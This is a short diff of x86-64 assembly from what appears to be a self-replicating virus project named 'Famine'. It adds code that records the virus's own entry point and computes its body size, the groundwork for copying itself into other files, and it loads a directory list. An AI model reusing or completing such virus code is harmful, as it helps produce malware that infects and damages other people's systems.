@@ -15,9 +15,21 @@ section .text
     mov rbp, rsp
     sub rbp, Famine_size            ; allocate Famine struct on stack
 
-    xor rax, rax
-    mov VAR(Famine.truncate_flag), rax
+    ; load virus entry
+    lea rax, _start
+    mov VAR(Famine.virus_entry), rax
 
+    ; load virus size
+
+    lea rax, _start
+    lea rbx, _finish
+    sub rbx, rax
+    mov VAR(Famine.virus_size), rbx
+
+    ; xor rax, rax
+    ; mov VAR(Famine.truncate_flag), rax
+    
+    ;load virus entry
     ;load dirs
     lea rdi, [dirs]
 
@@ -272,3 +284,5 @@ section .text
         .exit:
             mov rax, SC_EXIT
             syscall
+    
+    _finish:
